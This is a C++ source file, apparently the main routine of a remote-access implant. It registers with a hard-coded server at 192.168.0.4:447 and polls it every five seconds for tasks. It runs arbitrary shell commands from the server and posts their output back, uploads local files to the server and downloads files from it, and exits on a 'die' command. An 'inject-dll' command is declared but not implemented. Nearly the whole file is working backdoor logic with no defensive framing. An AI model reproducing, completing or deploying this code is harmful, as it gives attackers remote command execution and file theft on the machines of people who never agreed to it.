#include "TbComms.h"

int main()
{
	TbComms tCommsObj;
	string ip = "192.168.0.4";
	string port = "447";
	string reg = tCommsObj.genRegistrationRequest();
	string regout = tCommsObj.sendGet(ip, port, reg);
	string gettask = tCommsObj.genGetTaskRequest();

	LPSTR getter;
	char cmdDelim[] = "/50/cmd=";
	char* pCmd;
	char getFileDelim[] = "get-file ";
	char* pGetFile;
	char uploadFileDelim[] = "upload-file ";
	char* pUploadFile;
	char injectDllDelim[] = "inject-dll ";
	char* pInjectDll;
	char dieDelim[] = "die";
	char* pDie;
	while (true) {
		getter = tCommsObj.sendGet(ip, port, gettask);
		printf("%s\n", getter);
		pCmd = strstr(getter, cmdDelim);
		if (pCmd) {
			pDie = strstr(getter, dieDelim);
			if (pDie) {
				exit(EXIT_SUCCESS);
			}

			else if (strstr(getter, getFileDelim)) {
				printf("calling get file");
				pGetFile = strstr(getter, getFileDelim);
				int len = strlen(pGetFile) - strlen(getFileDelim);
				char* dest = (char*)malloc(sizeof(char) * (len + 1));

				for (int i = strlen(getFileDelim); i < strlen(pGetFile) && (*(pGetFile + i) != '\0'); i++)
				{
					*dest = *(pGetFile + i);
					dest++;
				}
				*dest = '\0';
				string filename = dest - len;
				printf(filename.c_str());
				string endpoint = tCommsObj.genDownloadFileRequest(filename.c_str());
				tCommsObj.sendGetFile(ip, port, endpoint, filename);
			}

			else if (strstr(getter, uploadFileDelim)) {
				printf("calling put file");
				pUploadFile = strstr(getter, uploadFileDelim);
				int len = strlen(pUploadFile) - strlen(uploadFileDelim);
				char* dest = (char*)malloc(sizeof(char) * (len + 1));

				for (int i = strlen(uploadFileDelim); i < strlen(pUploadFile) && (*(pUploadFile + i) != '\0'); i++)
				{
					*dest = *(pUploadFile + i);
					dest++;
				}
				*dest = '\0';
				string filename = dest - len;
				printf(filename.c_str());

				string endpoint = tCommsObj.genUploadFileRequest(filename.c_str());
				tCommsObj.sendPost(ip, port, endpoint, filename, true);

			}

			else {
				string cmdOutput = "";
				int len = strlen(pCmd) - strlen(cmdDelim);
				char* dest = (char*)malloc(sizeof(char) * (len + 1));

				for (int i = strlen(cmdDelim); i < strlen(pCmd) && (*(pCmd + i) != '\0'); i++)
				{
					*dest = *(pCmd + i);
					dest++;
				}
				*dest = '\0';
				cmdOutput = tCommsObj.executeCommand(dest - len);
				if (cmdOutput != "") {
					tCommsObj.sendPost(ip, port, tCommsObj.genPostCmdOutputRequest(), cmdOutput, false);
				}
			}

		}
		Sleep(5000);

	}
}
